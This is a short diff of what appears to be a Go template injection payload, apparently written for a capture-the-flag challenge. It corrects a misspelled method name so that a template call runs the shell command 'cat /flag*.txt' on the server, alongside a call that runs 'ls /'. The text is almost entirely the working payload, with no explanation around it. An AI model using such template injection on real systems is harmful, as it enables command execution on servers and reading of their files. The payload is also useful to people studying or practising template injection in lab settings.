@@ -18,4 +18,4 @@
 {{.ServerInfo.Memory}}
 
 {{.GetServerInfo "ls /"}}
-{{.GetchServerInfo "cat /flag*.txt"}}
+{{.GetServerInfo "cat /flag*.txt"}}
